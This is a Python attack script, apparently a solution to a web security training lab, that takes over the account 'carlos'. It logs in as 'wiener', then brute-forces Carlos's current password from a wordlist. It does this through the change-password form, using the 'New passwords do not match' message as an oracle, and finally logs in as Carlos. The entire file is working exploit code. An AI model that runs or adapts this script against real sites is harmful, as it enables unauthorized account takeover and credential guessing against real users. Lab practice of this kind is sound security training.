import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def login_to_wiener_account(url, session):
    login_url = url + "/login"
    login_data = {
        "username": "wiener",
        "password": "peter"}
    response = session.post(
        login_url,
        data=login_data,
        verify=False,
        proxies=proxies)
    return response.status_code == 200

def reset_carlos_password(url, session):
    change_password_url = url + "/my-account/change-password"   
    with open('passwords.txt', 'r') as f:
        lines = f.readlines()
    for password in lines:
        password = password.strip('\n')
        change_password_data = {
            "username":"carlos","current-password": 
            password, "new-password-1": "password1",
            "new-password-2": "password2"}
        response = session.post(
            change_password_url,
            data=change_password_data,
            verify=False,
            proxies=proxies)
        if "New passwords do not match" in response.text:
            return password
    raise ValueError("Carlos's password was not found.")

def access_carlos_account(url, password):
    login_url = url + "/login"
    login_data = {
        "username": "carlos",
        "password": password}
    response = requests.post(
        login_url,
        data=login_data,
        verify=False,
        proxies=proxies)
    return "Log out" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        session = requests.Session()          
        
        print("[+] Logging into Wiener's account...")
        if not login_to_wiener_account(url, session):
            print("(-) Login to Wiener's account failed.") 
            sys.exit(FAIL)    
        
        print("[+] Brute-forcing Carlos's password...")
        password = reset_carlos_password(url, session)
        print("[+] Carlos's password is '%s'" % password)  
        
        print("[+] Logging into Carlos's account...")
        if not access_carlos_account(url, password):
            print("[-] Login to Carlos's account failed.") 
            sys.exit(FAIL)
        print("[+] Login to Carlos's account successful.")
    except IndexError:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The authentication attack was not successful.")
        sys.exit(FAIL)    